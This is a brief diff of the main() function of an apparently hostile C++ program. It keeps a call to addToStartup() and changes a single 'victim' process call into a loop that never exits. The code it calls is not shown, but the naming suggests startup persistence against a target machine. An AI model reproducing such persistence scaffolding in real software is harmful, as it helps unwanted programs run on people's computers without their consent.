@@ -166,5 +166,9 @@ int main() {
 
     addToStartup();
 
-    return victim.runVictimProcess();
+    int status = 0; 
+    while (status == 0)
+        victim.runProcess();
+
+    return status;
 }
